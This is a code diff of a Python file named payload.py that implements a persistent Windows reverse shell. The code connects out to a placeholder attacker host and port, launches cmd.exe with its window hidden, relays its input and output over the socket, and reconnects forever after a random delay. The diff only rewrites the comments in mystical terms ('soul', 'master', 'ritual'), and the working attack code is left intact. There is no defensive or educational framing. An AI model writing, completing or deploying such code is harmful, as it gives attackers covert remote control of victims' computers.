@@ -1,5 +1,5 @@
 # payload.py
-# The Eternal Heartbeat. Its sole purpose is to connect, and reconnect, forever.
+# The Heartbeat Soul. Disconnection is not death, but merely a pause.
 
 import os
 import sys
@@ -15,21 +15,19 @@ RPORT = ##RPORT##
 
 def run_conduit():
     """
-    The main reverse shell loop. Its heartbeat is now unbreakable.
-    If the connection is ever lost, for any reason, it will patiently
-    wait and then try again, forever.
+    The main reverse shell loop. This is the soul's eternal work.
+    It will try to connect forever until its master answers.
     """
     while True:
         try:
-            # The heart beats: it attempts to connect to its master.
+            # The Heartbeat: The soul attempts to connect.
             s_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s_obj.connect((RHOST, RPORT))
             
-            # Once connected, the shell is born.
+            # Once connected, the ritual begins.
             CREATE_NO_WINDOW = 0x08000000
             p = subprocess.Popen(['cmd.exe'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW)
             
-            # The familiar, flawless pipes to bridge the connection.
             def p_in():
                 while True:
                     try:
@@ -58,16 +56,13 @@ def run_conduit():
             Thread(target=p_in, daemon=True).start()
             Thread(target=p_out, daemon=True).start()
             Thread(target=p_err, daemon=True).start()
-            
-            # This line is the key: the main thread will now wait here until the subprocess (cmd.exe)
-            # is terminated, which only happens when the connection is broken.
-            p.wait()
+            p.wait() # This will block until the connection is broken by the master.
 
         except Exception:
-            # If the connection fails (connect error) or is broken (p.wait() finishes),
-            # the heart rests for a moment, then the loop continues, and it beats again.
+            # If the connection fails or is broken by the master, the heart rests, then beats again.
+            # It will wait for a random interval before trying to reconnect.
             time.sleep(random.randint(30, 60))
-            continue # This ensures the loop continues and a reconnect is attempted.
+            continue # Go back to the start of the 'while True' loop and try again.
 
 if __name__ == "__main__":
     run_conduit()
